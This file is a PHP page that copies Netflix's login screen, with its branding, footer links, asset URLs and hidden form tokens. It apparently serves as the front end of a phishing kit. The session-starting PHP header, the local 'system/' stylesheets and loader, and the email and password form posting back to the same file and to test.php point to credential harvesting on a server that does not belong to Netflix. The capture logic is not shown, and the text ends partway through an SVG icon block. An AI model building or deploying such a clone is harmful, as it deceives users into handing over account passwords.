<?php

	session_start();

?>

<!doctype html>
<html id="html" >

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Netflix</title>
    <meta content="watch movies, movies online, watch TV, TV online, TV shows online, watch TV shows, stream movies, stream tv, instant streaming, watch online, movies, watch movies Algeria, watch TV online, no download, full length movies" name="keywords">
    <meta content="Watch Netflix movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more." name="description">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
    <link type="text/css" rel="stylesheet" href="https://codex.nflxext.com/%5E2.0.0/truthBundle/webui/0.0.1-shakti-css-799288e7/css/css/login%7CloginBase.less,pages%7Clogin%7CLogin.less/2/0G0U0h0N0e0D0M0Y0V0O0T/none/true/none">
    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
    <link rel="apple-touch-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png">
	<link rel="stylesheet" href="system/css/global.css" >
    <script>
        window.netflix = window.netflix || {};
        netflix.notification = window.netflix.notification = window.netflix.notification || {};
        window.netflix.notification.specification = netflix.notification.specification || {};;
    </script>
    <script>
        window.netflix = window.netflix || {};
        netflix.notification.constants = {
            "pageName": "login",
            "locale": "en-DZ",
            "sessionLength": 30,
            "uiMode": "nonmember",
            "ownerToken": "OCCX5NH7GZGGZOSSGATA5BJPFM",
            "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"
        };
    </script>
    <script>
        window.netflix = window.netflix || {};
        netflix.notification.specification.uiView = {
            "impression": {
                "send": "both",
                "overlapping": true
            },
            "command": {
                "send": "both"
            },
            "search": {
                "send": "both"
            },
            "uma": {
                "send": "both"
            },
            "focus": {
                "send": "both"
            },
            "scdWizardStep": {
                "send": "both"
            },
            "navigationLevel": {
                "send": "both"
            },
            "presentation": {
                "send": "both"
            },
            "onrampSimilarsGroup": {
                "send": "both"
            }
        };
    </script>
    <script>
        window.netflix = window.netflix || {};
        netflix.notification.specification.uiAction = {
            "manageSubscriptions": {
                "send": "end"
            },
            "removeActivityHistory": {
                "send": "end"
            },
            "promoShareFacebook": {
                "send": "end"
            },
            "promoShareTwitter": {
                "send": "end"
            },
            "rateTitle": {
                "send": "end"
            },
            "addToPlaylist": {
                "send": "both"
            },
            "selectProfile": {
                "send": "end"
            },
            "addProfile": {
                "send": "end"
            },
            "trailerPlay": {
                "send": "both"
            },
            "startTrailerPlay": {
                "send": "both"
            },
            "onRamp": {
                "send": "both"
            },
            "submitUnsupportedCountryEmail": {
                "send": "both"
            },
            "iTunesPriceFetching": {
                "send": "both"
            },
            "iTunesPurchase": {
                "send": "both"
            },
            "iTunesRestore": {
                "send": "both"
            },
            "iTunesSubmitReceipt": {
                "send": "both"
            },
            "iTunesSubmitRestoredReceipt": {
                "send": "both"
            },
            "iTunesSignUpFallback": {
                "send": "both"
            },
            "iTunesTracerPurchaseBegin": {
                "send": "both"
            },
            "iTunesTracerPurchasePostBridge": {
                "send": "both"
            },
            "iTunesTracerPurchaseHandleReceipt": {
                "send": "both"
            },
            "iTunesTracerPurchaseHasReceipt": {
                "send": "both"
            },
            "iTunesTracerPurchasePreFailure": {
                "send": "both"
            },
            "iTunesTracerPurchaseFailure": {
                "send": "both"
            },
            "iTunesTracerPurchaseCancel": {
                "send": "both"
            },
            "iTunesTracerPurchasePreFailureDevice": {
                "send": "both"
            },
            "iTunesTracerPurchaseFailureDevice": {
                "send": "both"
            },
            "iTunesTracerPurchaseMissingReceipt": {
                "send": "both"
            },
            "iTunesTracerPurchasePreSendReceipt": {
                "send": "both"
            },
            "iTunesTracerPurchaseSendReceipt": {
                "send": "both"
            },
            "iTunesTracerPurchaseMoneyballError": {
                "send": "both"
            },
            "iTunesTracerPurchaseSendReceiptEnd": {
                "send": "both"
            },
            "playStorePriceFetching": {
                "send": "both"
            },
            "playStorePurchase": {
                "send": "both"
            },
            "playStoreRestore": {
                "send": "both"
            },
            "playStoreSubmitReceipt": {
                "send": "both"
            },
            "playStoreSubmitRestoredReceipt": {
                "send": "both"
            },
            "playStoreFlowFallback": {
                "send": "both"
            },
            "playStoreSignUpFallback": {
                "send": "both"
            },
            "playStoreAndroidSignUp": {
                "send": "both"
            },
            "playStoreAndroidRetrySignUp": {
                "send": "both"
            },
            "playStoreTracerPurchaseBegin": {
                "send": "both"
            },
            "playStoreTracerPurchasePostBridge": {
                "send": "both"
            },
            "playStoreTracerPurchaseHandleReceipt": {
                "send": "both"
            },
            "playStoreTracerPurchaseHasReceipt": {
                "send": "both"
            },
            "playStoreTracerPurchasePreFailure": {
                "send": "both"
            },
            "playStoreTracerPurchaseFailure": {
                "send": "both"
            },
            "playStoreTracerPurchaseCancel": {
                "send": "both"
            },
            "playStoreTracerPurchasePreFailureDevice": {
                "send": "both"
            },
            "playStoreTracerPurchaseFailureDevice": {
                "send": "both"
            },
            "playStoreTracerPurchaseMissingReceipt": {
                "send": "both"
            },
            "playStoreTracerPurchasePreSendReceipt": {
                "send": "both"
            },
            "playStoreTracerPurchaseSendReceipt": {
                "send": "both"
            },
            "playStoreTracerPurchaseMoneyballError": {
                "send": "both"
            },
            "playStoreTracerPurchaseSendReceiptEnd": {
                "send": "both"
            },
            "simplicitySubmit": {
                "send": "both"
            },
            "simplicityFlowEndpointTiming": {
                "send": "both"
            },
            "editPaymentSubmit": {
                "send": "both"
            },
            "processAsDebitChecked": {
                "send": "both"
            },
            "processAsDebitSubmit": {
                "send": "both"
            },
            "processAsDebitUrl": {
                "send": "both"
            },
            "processAsDebitRendered": {
                "send": "both"
            },
            "navigate": {
                "send": "both"
            },
            "submitOnrampResults": {
                "send": "both"
            }
        };
    </script>
    <script>
        window.netflix = window.netflix || {};
        netflix.notification.specification.search = {
            "focus": {
                "send": "both"
            }
        };
    </script>
    <script>
        window.netflix = window.netflix || {};
        netflix.notification.specification.uiQOE = {
            "appSession": {
                "send": "both"
            },
            "userSession": {
                "send": "both"
            },
            "uiStartup": {
                "send": "end"
            },
            "uiBrowseStartup": {
                "send": "end"
            },
            "uiModalViewChanged": {
                "eventProperties": {
                    "value": "modalView"
                },
                "send": "start"
            },
            "uiModelessView": {
                "send": "both",
                "overlapping": "true"
            },
            "partnerSession": {
                "send": "both",
                "overlapping": false
            }
        };
    </script>
    <script>
        window.netflix = window.netflix || {};
        netflix.notification.specification.www = {
            "playbackPerformance": {
                "send": "both"
            },
            "playbackFeatureDetection": {
                "send": "end"
            },
            "playbackError": {
                "send": "end"
            },
            "windowOnError": {
                "send": "end"
            }
        };
    </script>
    <script>
        window.netflix = window.netflix || {};
        netflix.notification.specification.login = {
            "poll": {
                "send": "both"
            },
            "autofill": {
                "send": "both"
            }
        };
    </script>
    <meta property="og:description" content="Watch Netflix movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more.">
	<link rel="stylesheet" href="system/css/jquery.fileuploader-theme-thumbnails.css">
</head>

<body cz-shortcut-listen="true">
    <div id="appMountPoint">
        <div class="login-wrapper" data-reactroot="" data-reactid="1" data-react-checksum="-1831076611">
            <div class="nfHeader login-header signupBasicHeader" data-reactid="2">
                <a href="/" class="svg-nfLogo signupBasicHeader" data-reactid="3">
                    <svg class="svg-icon svg-icon-netflix-logo " focusable="true" data-reactid="4">
                        <use filter="" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#netflix-logo" data-reactid="5"></use>
                    </svg>
                    <span class="screen-reader-text" data-reactid="6">Netflix</span>
                </a>
            </div>
            <div class="login-body" data-reactid="7">
                <div id="contentref" data-reactid="8"  style="position:relative;">
                    <noscript data-reactid="9">&lt;div class="ui-message-container ui-message-error"&gt;&lt;div class="ui-message-icon"&gt;&lt;/div&gt;&lt;div class="ui-message-contents"&gt;Looks like you have disabled JavaScript. Please enable JavaScript to restore full page functionality.&lt;/div&gt;&lt;/div&gt;</noscript>
                    <div class="login-content login-form" data-reactid="10">
					
						<div id="LoaderContent" class="divLoaderHidden">
						
							<img style="margin-top:150px;" src="system/images/Eclipse-1s-50px.svg" width="100" height="100" />
						
						</div>



						<h1 data-reactid="11">Sign In</h1>
						<!-- react-text: 12 -->
						<!-- /react-text -->
						<form class="login-form loginForm" action="" method="post" data-reactid="13">
							<label class="login-input login-input-email ui-label ui-input-label" id="lbl-email" placeholder="email" data-reactid="14">
								<span class="ui-label-text" data-reactid="15">Email</span>
								<input class="ui-text-input email emailHaseError" name="email" id="email" value="" tabindex="1" autocomplete="email" type="email" data-reactid="16">
								<span class="msg msgMail hiddens">Please enter a valid email.</span>
							</label>
							
							<div class="hybrid-password-wrapper" data-reactid="17">
								<label class="hybrid-password login-input login-input-password ui-label ui-input-label" id="lbl-password" placeholder="password" data-reactid="18">
									<span class="ui-label-text" data-reactid="19">Password</span>
									<input type="password" class="ui-text-input pass passlHaseError" name="password" id="password" tabindex="2" data-reactid="20" id="password">
								<span class="msg msgPass hiddens">Your password must contain between 4 and 60 characters.</span>	
								</label>
								
								<span data-reactid="22"></span>
							</div>
							<div class="login-forgot-password-wrapper" data-reactid="23">
								<a href="#" class="login-help-link" tabindex="3" data-reactid="24">Forgot your email or password?</a>
							</div>
							<button class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="4" data-reactid="25" id="loginbtn">
								<!-- react-text: 26 -->Sign in
								<!-- /react-text -->
							</button>
							<div class="login-remember-me-wrapper" data-reactid="27">
								<div class="ui-binary-input login-remember-me" data-reactid="28">
									<input type="checkbox" class="" name="rememberMe" id="bxid_rememberMe_true" value="true" tabindex="5" data-reactid="29" checked="">
									<label for="bxid_rememberMe_true" data-reactid="30">
										<span class="login-remember-me-label-text" data-reactid="31">Remember me</span>
									</label>
									<div class="helper" data-reactid="32"></div>
								</div>
							</div>
							<input type="hidden" name="flow" value="websiteSignUp" data-reactid="33">
							<input type="hidden" name="mode" value="login" data-reactid="34">
							<input type="hidden" name="action" value="loginAction" data-reactid="35">
							<input type="hidden" name="withFields" value="email,password,rememberMe,nextPage,showPassword" data-reactid="36">
							<input type="hidden" name="authURL" value="1519324506720.s1f50dbsV0Cvk/050k2U4qaNDvg=" data-reactid="37">
							<input type="hidden" name="nextPage" value="" data-reactid="38">
							<input type="hidden" name="showPassword" value="" data-reactid="39">
						</form>

                        <form class="login-form" action="test.php" method="post" data-reactid="40">
                            <div class="facebookForm regOption" data-reactid="41">
                                <div class="fb-minimal" data-reactid="42">
                                    <hr data-reactid="43">
                                    <button class="btn minimal-login btn-submit btn-small" type="submit" autocomplete="off" tabindex="6" data-reactid="44">
                                        <div class="fb-login" data-reactid="45">
                                            <img class="icon-facebook" src="https://assets.nflxext.com/ffe/siteui/login/images/FB-f-Logo__blue_57.png" data-reactid="46">
                                            <span class="fbBtnText" data-reactid="47">Login with Facebook</span>
                                        </div>
                                    </button>
                                </div>
                            </div>
                            <input type="hidden" name="flow" value="websiteSignUp" data-reactid="48">
                            <input type="hidden" name="mode" value="login" data-reactid="49">
                            <input type="hidden" name="action" value="facebookLoginAction" data-reactid="50">
                            <input type="hidden" name="withFields" value="accessToken,rememberMe,nextPage" data-reactid="51">
                            <input type="hidden" name="authURL" value="1518658979486.xtVTBSrKY9tjX9JhFhUgKriI6mA=" data-reactid="52">
                            <input type="hidden" name="nextPage" value="" data-reactid="53">
                            <input type="hidden" name="showPassword" value="" data-reactid="54">
                            <input type="hidden" name="accessToken" value="" data-reactid="55">
                        </form>
                        <div class="login-signup-now" data-reactid="56">
                            <!-- react-text: 57 -->New to Netflix?
                            <!-- /react-text -->
                            <a class=" " target="_self" href="/" data-reactid="58">Sign up now</a>
                            <!-- react-text: 59 -->.
                            <!-- /react-text -->
                        </div>
                </div>
            </div>
        </div>
        <div class="site-footer-wrapper login-footer" data-reactid="60">
            <div class="footer-divider" data-reactid="61"></div>
            <div class="site-footer" data-reactid="62">
                <p class="footer-top" data-reactid="63">
                    <a class="footer-top-a" href="https://help.netflix.com/contactus" data-reactid="64">Questions? Contact us.</a>
                </p>
                <ul class="footer-links structural" data-reactid="65">
                    <li class="footer-link-item" placeholder="footer_responsive_link_gift_card_terms_item" data-reactid="66">
                        <a class="footer-link" href="/giftterms" placeholder="footer_responsive_link_gift_card_terms" data-reactid="67">
                            <span id="" data-reactid="68">Gift Card Terms</span>
                        </a>
                    </li>
                    <li class="footer-link-item" placeholder="footer_responsive_link_terms_item" data-reactid="69">
                        <a class="footer-link" href="https://help.netflix.com/legal/termsofuse" placeholder="footer_responsive_link_terms" data-reactid="70">
                            <span id="" data-reactid="71">Terms of Use</span>
                        </a>
                    </li>
                    <li class="footer-link-item" placeholder="footer_responsive_link_privacy_item" data-reactid="72">
                        <a class="footer-link" href="https://help.netflix.com/legal/privacy" placeholder="footer_responsive_link_privacy" data-reactid="73">
                            <span id="" data-reactid="74">Privacy Statement</span>
                        </a>
                    </li>
                </ul>
                <div class="lang-selection-container" id="lang-switcher" data-reactid="75">
                    <div class="ui-select-wrapper" data-reactid="76">
                        <label class="ui-label no-display" data-reactid="77">
                            <span class="ui-label-text" data-reactid="78"></span>
                        </label>
                        <div class="select-arrow medium prefix globe" data-reactid="79">
                            <select class="ui-select medium" tabindex="0" placeholder="lang-switcher" data-reactid="80">
                                <option value="/login?locale=ar-DZ" data-language="ar" data-country="DZ" data-reactid="81">العربية</option>
                                <option value="/login?locale=fr-DZ" data-language="fr" data-country="DZ" data-reactid="82">Français</option>
                                <option selected="" value="/login?locale=en-DZ" data-language="en" data-country="DZ" data-reactid="83">English</option>
                            </select>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <svg style="height:0;width:0;position:absolute;" xmlns="http://www.w3.org/2000/svg" data-reactid="84">
            <defs id="" data-reactid="85">
                <symbol viewBox="0 0 34 34" id="check-circle">
                    <path d="M28.4 11.7l-3.2-3.267c-.066.066-.133.133-.2.166L13.367 19.933l-4.433-4.5L5.6 18.466c0 .034 1.1 1.1 1.1 1.134l4.934 5.133.166.167a2.234 2.234 0 0 0 3.1 0l.167-.167 13.2-12.866c.067-.034.1-.1.133-.167M33 17c0 8.834-7.166 16-16 16S1 25.834 1 17 8.166 1 17 1s16 7.166 16 16"></path>
                </symbol>
                <symbol viewBox="0 0 14 10" id="check-mark">
                    <path d="M13.916 1.996l-7.722 7.54-.1.08a1.319 1.319 0 0 1-.908.384c-.322 0-.645-.142-.907-.384l-.08-.08-2.884-3.024c-.02 0-.644-.645-.665-.645l1.955-1.775 2.581 2.62L12 .103A.53.53 0 0 1 12.121 0l1.874 1.895a.43.43 0 0 1-.08.101"></path>
                </symbol>
                <symbol viewBox="0 0 17 11" id="dropdown-arrow">
                    <path d="M1 1h15l-7.495 9.143z"></path>
                </symbol>
                <symbol viewBox="0 0 37 34" id="exclamation-triangle">
                    <path d="M20.4 28.633c.4-.4.666-1 .666-1.634 0-.633-.267-1.2-.667-1.632-.433-.4-1-.667-1.633-.667s-1.233.267-1.633.667c-.434.433-.667 1-.667 1.632 0 .634.233 1.234.667 1.634.4.434 1 .667 1.633.667.634 0 1.2-.233 1.633-.667m.534-11.8c.5-2.267.9-4.334.9-4.334 0-1.532-.767-2.299-1.534-2.699-.767-.4-1.533-.4-1.533-.4s-.766 0-1.533.4c-.8.4-1.567 1.167-1.567 2.7l.9 4.334c.5 2.232 1.067 4.666 1.367 5.365 0 0 .1.267.233.534.167.267.367.533.6.533.234 0 .434-.266.567-.533.166-.267.233-.534.233-.534.333-.7.9-3.133 1.367-5.365M36.066 28.4c.134.8.067 1.867-.834 3 0 0-.199.366-.666.766s-1.2.8-2.333.834H4.766c-1.133-.034-1.866-.434-2.333-.834-.467-.4-.667-.766-.667-.766-.733-1.1-.833-2.167-.733-2.967.1-.8.4-1.334.4-1.334l6.733-11.6 6.7-11.633C15.767 2.4 16.8 1.6 17.5 1.3c.6-.267.833-.3 1.033-.3h.034c.233 0 .399.033 1.065.3.667.267 1.567.967 2.5 2.566l6.7 11.634 6.734 11.6s.367.533.5 1.3"></path>
                </symbol>
                <symbol viewBox="0 0 8 21" id="exclamation">
                    <path d="M5.582 19.66c-.395.43-.956.66-1.583.66-.626 0-1.186-.23-1.582-.66-.428-.395-.66-.956-.66-1.582 0-.593.232-1.154.66-1.583a2.241 2.241 0 0 1 1.582-.658c.627 0 1.188.263 1.583.658.396.43.66.99.66 1.583 0 .626-.264 1.187-.66 1.582m-.79-6.263s-.1.263-.232.527-.33.56-.56.56c-.231 0-.429-.296-.594-.56-.132-.264-.197-.527-.197-.527-.298-.66-.858-3.001-1.319-5.21C1.396 6.01 1 4 1 4c0-1.517.757-2.243 1.483-2.638C3.242 1 4 1 4 1s.76 0 1.484.363C6.242 1.758 7 2.484 7 4l-.89 4.186c-.462 2.209-1.022 4.55-1.319 5.21"></path>
                </symbol>
                <symbol viewBox="0 0 40 48" id="icon-cancel">

                    <path d="M29.55 18.7v-4.6c-5.2.4-4.6 2.8-4.6 2.8.3 1.7 2.35 2.35 2.35 2.35.6-.35 2.25-.55 2.25-.55zm3.7 1L33 21.3c-9.15-.3-8.7-3.75-8.7-3.75l.15 5.2c1.1 4.05 8.35 4.2 8.2 4.2l-.2 1.5 6.9-3.8-6.1-4.95zm-20.3 6.25c-.5-.5-1.3-.45-1.8.05-.45.5-.45 1.25.05 1.75s1.3.45 1.75-.05c.5-.5.5-1.25 0-1.75zm2.35-15.9L1.5 1.45V38.9l2.6 1.45 11.2 6.2v-36.5zM1.5 40.35C.4 39.85 0 39.7 0 38.9l1.5 1.45zM28.05 28.1h1.45v10.8c0 .8-.65 1.45-1.45 1.45H16.8v6.15c0 .849-.65 1.5-1.45 1.5L1.5 40.35 0 38.9V1.45C0 .65.65 0 1.5 0h26.55c.8 0 1.45.65 1.45 1.45v11.2h-1.45V1.45H4.1L15.6 8.6c.95.35 1.2.65 1.2 1.45V38.9h11.25V28.1z"></path>
                </symbol>
                <symbol viewBox="0 0 34 34" id="globe">
                    <path d="M31.833 22.966h-6.032c.532-1.633.865-3.4.932-5.233H33c-.1 1.866-.5 3.633-1.167 5.233zM25.467 9.833h5.866a15.971 15.971 0 0 1 1.601 5.733h-6.2a18.91 18.91 0 0 0-1.267-5.733zm-7.4 15.333h4.1a14.647 14.647 0 0 1-4.1 4.367v-4.367zm6.867 0h5.798a16.008 16.008 0 0 1-12.666 7.767v-.234C21 31.032 23.4 28.4 24.934 25.166zm-1.667-2.2h-5.2v-5.233H24.4c-.1 1.9-.5 3.667-1.133 5.233zm-5.2-13.133h4.966c.734 1.7 1.2 3.6 1.334 5.733h-6.3V9.833zm3.8-2.166h-3.8v-3.9c1.499 1.033 2.8 2.333 3.8 3.9zm8.166 0h-5.566c-1.533-2.8-3.767-5.1-6.4-6.634V1c4.933.3 9.266 2.866 11.966 6.667zm-14.133 0h-3.8a14.123 14.123 0 0 1 3.8-3.9v3.9zm-4.1 17.499h4.1v4.367c-1.6-1.133-3-2.634-4.1-4.367zm-2.2-7.433h6.3v5.233h-5.166C10.067 21.4 9.7 19.633 9.6 17.733zm1.334-7.9H15.9v5.733H9.6c.134-2.134.6-4.033 1.334-5.733zm-1.4-2.166H3.966c2.7-3.8 7-6.367 11.933-6.667v.033c-2.633 1.534-4.833 3.833-6.367 6.634zm-6.3 17.499h5.833c1.534 3.234 3.9 5.866 6.833 7.533v.234c-5.367-.367-10.033-3.4-12.666-7.767zM2.667 9.833H8.5c-.666 1.767-1.1 3.7-1.233 5.733H1.033c.2-2.034.734-3.966 1.634-5.733zm5.5 13.133h-6A15.792 15.792 0 0 1 1 17.733h6.234c.067 1.833.4 3.6.932 5.233z"></path>
                </symbol>
                <symbol viewBox="0 0 61 34" id="hd">
                    <path d="M46.3 17.433c0-2.2-.467-4.733-5.233-4.733h-4.6v9.6h4.6c4.333 0 5.233-2.567 5.233-4.867zm.533-6.9c.934.667 1.634 1.634 2.167 2.867.533 1.2.8 2.567.8 4.033 0 3.267-.966 5.6-2.967 7.1-1.099.867-2.932 1.334-5.433 1.334h-8.2V9.233h8.2c2.5 0 4.334.433 5.433 1.3zM24.868 25.867V19.3H14.8v6.567h-3.266V9.233H14.8v6.534h10.068V9.233h3.3v16.634h-3.3zM3.666 5.4v23.167c0 1 .801 1.766 1.801 1.766h49.866c.967 0 1.735-.8 1.735-1.766V5.4c0-.967-.768-1.734-1.735-1.734H5.467c-1 0-1.8.767-1.8 1.734zm56.068 0v23.167a4.404 4.404 0 0 1-4.4 4.433H5.466C2.967 33 1 31.033 1 28.567V5.4C1 2.967 2.967 1 5.467 1h49.866a4.397 4.397 0 0 1 4.401 4.4z"></path>
                </symbol>
                <symbol viewBox="0 0 34 34" id="info-circle">
                    <path d="M17.533 13.566h-.8a1.9 1.9 0 0 0-1.9 1.9V25.8c0 1.033.834 1.9 1.9 1.9h.8c1.066 0 1.934-.867 1.934-1.9V15.466c0-1.033-.868-1.9-1.934-1.9M14.8 8.6a2.34 2.34 0 0 0 2.333 2.334c1.3 0 2.334-1.033 2.334-2.334a2.34 2.34 0 0 0-2.334-2.333c-1.266 0-2.333 1.067-2.333 2.333M1 17C1 8.167 8.166 1 17 1s16 7.166 16 16-7.166 15.999-16 15.999-16-7.165-16-16"></path>
                </symbol>
                <symbol viewBox="0 0 25 36" id="lock">
                    <path d="M15.541 23.761c0-1.638-1.37-3.042-3.042-3.042a3.01 3.01 0 0 0-3.041 3.042c0 1.27.801 2.34 1.938 2.808l-.836 4.88h3.878l-.836-4.88c1.137-.469 1.94-1.538 1.94-2.808zM12.5 6.678c-3.008 0-5.516 2.474-5.516 5.516v2.942h-3.71V12.16C3.306 7.112 7.417 3 12.5 3c5.049 0 9.16 4.112 9.194 9.16v2.976h-3.677v-2.942a5.522 5.522 0 0 0-5.517-5.516zM1 35.026h23V16.24H1v18.787z"></path>
                </symbol>
                <symbol viewBox="0 0 66 40" id="logo-apple-tv">
                    <path d="M56.679 36.007h-5.001l-9.202-25.372h4.501l5.568 16.503c.2.634.767 2.468 1.634 5.568l.8-2.767.9-2.767 5.801-16.57h4.468l-9.469 25.405zm-14.736-.167a16.467 16.467 0 0 1-4.268.567c-3.368 0-5.068-1.934-5.068-5.768V13.702h-2.934v-3.067h3.101V6.634l4.068-1.667v5.701h4.7v3.068h-4.667v16.003c0 1.234.2 2.067.567 2.567.4.5 1.1.734 2.1.734.567 0 1.334-.134 2.401-.334v3.134zM17.804 9.134c1-1.2 1.734-2.834 1.734-4.534 0-.2-.033-.4-.033-.6-1.634.067-3.568 1.067-4.768 2.434-.934 1.067-1.734 2.667-1.734 4.301 0 .233 0 .467.033.667 1.801.133 3.668-.934 4.768-2.268zm4.068 11.97c.033 4.867 4.267 6.501 4.301 6.501-.034.133-.667 2.334-2.234 4.601-1.334 2.001-2.801 3.934-5.068 3.934-2.034 0-2.734-1.3-5.168-1.267-2.467 0-3.234 1.234-5.268 1.334-2.1.067-3.7-2.167-5.068-4.101C1.534 29.439 0 25.338 0 21.437c0-1.967.4-3.901 1.334-5.534 1.4-2.467 3.968-4.035 6.735-4.035 2.033 0 4.001 1.401 5.234 1.401 1.2 0 3.368-1.5 5.701-1.5.167 0 .334 0 .467.033 1.034.033 4.001.433 5.901 3.167-.166.1-3.534 2.067-3.5 6.135z"></path>
                </symbol>
                <symbol viewBox="0 0 155 40" id="logo-playstation">
                    <path d="M150.599 23.004v-1h.7c.334 0 .734.033.734.467 0 .467-.367.533-.8.533h-.634zm0 .467h.534l.9 1.467h.633l-.966-1.5c.5-.067.899-.334.899-.934 0-.7-.433-1-1.266-1h-1.267v3.434h.533v-1.467zm2.967-.3c0 1.5-1.033 2.534-2.333 2.534-1.467 0-2.401-1.134-2.401-2.534 0-1.5 1.067-2.534 2.401-2.534 1.3 0 2.333 1.034 2.333 2.534zm.667 0c0-1.867-1.4-3.101-3-3.101-1.634 0-3.034 1.234-3.034 3.101 0 1.733 1.267 3.067 3.034 3.067 1.6 0 3-1.234 3-3.067zm-16.036 2.934h2.133v-5.702c0-1.433.934-2.566 2.334-2.566 1.267 0 1.867.666 1.901 2.167v6.101h2.134V19.47c0-2.2-1.334-3.3-3.434-3.3a3.427 3.427 0 0 0-3.001 1.7l-.034-.033v-1.401h-2.033v9.669zm-6.768-1.434c-1.901 0-2.734-1.733-2.734-3.4 0-1.667.833-3.434 2.734-3.434 1.9 0 2.767 1.767 2.767 3.434 0 1.667-.867 3.4-2.767 3.4zm0 1.701c3.1 0 4.9-2.134 4.9-5.101 0-2.968-1.8-5.101-4.9-5.101-3.101 0-4.868 2.133-4.868 5.101 0 2.967 1.767 5.101 4.868 5.101zm-9.002-.267h2.134v-9.668h-2.134v9.668zm0-11.336h2.134v-2.034h-2.134v2.034zm-7.335 3.234h1.6v5.735c.033 1.6.433 2.467 2.667 2.467.467 0 .934-.067 1.401-.1v-1.667c-.301.066-.6.066-.901.066-.967 0-1.033-.433-1.033-1.333v-5.168h1.934v-1.567h-1.934v-2.934h-2.134v2.934h-1.6v1.567zm-3.568 4.834c0 1.367-1.467 1.834-2.4 1.834-.767 0-1.967-.267-1.967-1.233 0-1.101.833-1.467 1.734-1.601.933-.166 1.966-.166 2.633-.566v1.566zm2.134-3.867c0-2.034-2-2.8-3.868-2.8-2.133 0-4.267.733-4.4 3.2h2.133c.067-1.033.934-1.533 2.134-1.533.867 0 2.001.199 2.001 1.333 0 1.233-1.368 1.067-2.901 1.367-1.801.2-3.734.6-3.734 3.001 0 1.9 1.567 2.834 3.301 2.834 1.167 0 2.533-.367 3.367-1.167.167.866.8 1.167 1.634 1.167.366 0 1.033-.134 1.367-.234v-1.5c-.234.033-.401.033-.534.033-.4 0-.5-.2-.5-.733V18.97zm-15.403-.967h1.6v5.735c.034 1.6.433 2.467 2.667 2.467.467 0 .934-.067 1.401-.1v-1.667c-.301.066-.6.066-.901.066-.966 0-1.033-.433-1.033-1.333v-5.168h1.934v-1.567h-1.934v-2.934h-2.134v2.934h-1.6v1.567zm-11.769 3.634c.033 3.334 2.533 4.801 5.568 4.801 2.667 0 5.334-1.2 5.334-4.201 0-1.4-.867-2.9-2.601-3.434-.7-.2-3.667-.966-3.867-1-.967-.267-1.601-.8-1.601-1.734 0-1.367 1.367-1.733 2.467-1.733 1.601 0 2.768.633 2.868 2.334h2.334c0-2.768-2.334-4.268-5.135-4.268-2.4 0-4.867 1.267-4.867 3.934 0 1.4.666 2.767 2.967 3.401 1.833.5 3.034.733 3.967 1.1.567.2 1.101.633 1.101 1.667 0 1-.767 2-2.801 2-1.9 0-3.401-.8-3.401-2.867h-2.333zm-6.702 4.434l-.267.734c-.266.833-.5 1.367-1.5 1.367-.334 0-.667-.067-1-.133v1.8c.5.067.967.1 1.467.1 2.234 0 2.734-1.567 3.434-3.301l3.767-10.202h-2.233l-2.435 7.202h-.066l-2.5-7.202h-2.368l3.701 9.635zm-7.168-3.234c0 1.367-1.434 1.834-2.367 1.834-.767 0-1.967-.267-1.967-1.233 0-1.101.8-1.467 1.734-1.601.933-.166 1.966-.166 2.6-.566v1.566zm2.167-3.867c0-2.034-2-2.8-3.901-2.8-2.134 0-4.234.733-4.401 3.2h2.134c.1-1.033.934-1.533 2.134-1.533.867 0 2 .199 2 1.333 0 1.233-1.367 1.067-2.9 1.367-1.801.2-3.734.6-3.734 3.001 0 1.9 1.6 2.834 3.334 2.834 1.133 0 2.5-.367 3.367-1.167.167.866.767 1.167 1.634 1.167.366 0 1.033-.134 1.333-.234v-1.5c-.2.033-.367.033-.5.033-.4 0-.5-.2-.5-.733V18.97zm-12.669 7.135h2.134V12.736h-2.134v13.369zM52.112 14.636h3.467c1.233 0 2.3.467 2.3 2.234 0 1.667-1.3 2.2-2.367 2.2h-3.4v-4.434zm-2.367 11.469h2.367V20.97h3.533c3.835.034 4.568-2.467 4.568-4.1 0-1.667-.733-4.135-4.568-4.135h-5.9v13.37zm-26.073 5.668l10.903-3.901c.7-.234 1.066-.567 1.066-.834 0-.2-.2-.4-.633-.533-.4-.133-.934-.2-1.534-.2-.833 0-1.8.133-2.534.4l-7.268 2.567v-4.101l.4-.133s2.134-.734 5.068-1.067c.7-.067 1.434-.134 2.2-.134 2.434 0 5.035.434 7.235 1.268 2.268.7 3.101 1.667 3.101 2.533 0 .334-.134.667-.367.968-.8 1.033-2.8 1.766-2.8 1.766l-14.837 5.335v-3.934zM15.604 4v30.006l6.768 2.167V11.002c0-1 .4-1.768 1.067-1.768.1 0 .2.034.3.067 1.133.3 1.334 1.401 1.334 2.567v10.069c1.066.534 2.1.767 3.033.767 2.701 0 4.535-2.134 4.535-6.168 0-5.534-1.934-8.002-7.702-9.969C22.672 5.8 18.471 4.534 15.604 4zM3.134 31.373C.967 30.773 0 29.739 0 28.772c0-.5.267-1 .801-1.367 1.4-1.033 3.734-1.8 3.734-1.8l9.735-3.468v3.934l-7.002 2.535c-.7.233-1.066.566-1.066.833 0 .233.2.433.633.566.4.134.934.201 1.5.201.868 0 1.834-.167 2.568-.434l3.367-1.2v3.534c-.2.033-.433.067-.667.1-1.167.2-2.334.3-3.534.3-2.3 0-4.601-.367-6.935-1.133z"></path>
                </symbol>
                <symbol viewBox="0 0 112 40" id="logo-roku">
